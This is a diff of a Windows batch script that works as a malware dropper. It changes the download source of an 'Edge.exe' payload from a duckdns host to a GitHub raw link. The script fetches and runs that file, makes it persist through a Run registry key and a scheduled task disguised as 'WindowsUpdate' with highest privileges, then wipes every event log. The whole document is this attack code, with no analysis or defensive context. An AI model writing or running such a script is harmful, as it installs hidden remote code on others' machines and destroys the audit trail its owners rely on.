@@ -21,10 +21,11 @@ cls
 echo --------------------cerete-my-path--------------------------------------------------
 mkdir "%systemdrive%\programdata\Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://megoo.duckdns.org/Edge.exe','%programdata%\Win\Edge.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/moyousry95/slash2/raw/refs/heads/main/Edge.exe','%programdata%\Win\Edge.exe')
 echo -----------start-paylod------------------------
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\Win\Edge.exe"
 schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\Win\Edge.exe" /f
 start %programdata%\Win\Edge.exe
 echo -----------delete-evnt-log-------------------------------------------
+
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
